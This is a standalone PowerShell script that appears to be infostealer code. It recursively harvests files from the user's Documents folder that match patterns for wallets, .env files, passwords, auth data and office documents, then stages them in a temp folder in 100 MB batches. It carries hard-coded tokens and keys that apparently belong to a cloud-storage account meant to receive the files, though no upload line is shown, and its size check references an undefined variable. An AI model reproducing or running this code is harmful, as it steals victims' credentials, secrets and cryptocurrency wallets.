$s=$env:USERPROFILE+"\Documents\*";$fileTypes="*.txt","*wallet*","*.env","*.x*","*.doc*","*pass*","*auth*"; $r="B1oiS5_ksmIAAAAAAAAAAThmk-sKjvpgKZDGaSObRSk9KNC3XQKbUt35MTkqdy3f"; $u = '60soiqecjsvvvzg'; $p = 'sk0n5x76b52ttht';$ds=$env:TMP+"\cpy";$n = 0;$mb = 0;if(Test-Path $ds){rm $ds -Fo -R;}GCI $s -R -I $fileTypes|%{$sz = ((GCI $_.FullName).length/1MB);if($size -lt 100){$mb+=$sz;if($mb -ge 100){$mb = 0;$n++;}ROBOCOPY $_.Directory ("$ds\$n\") $_.Name /MT 128 |Out-Null;}}
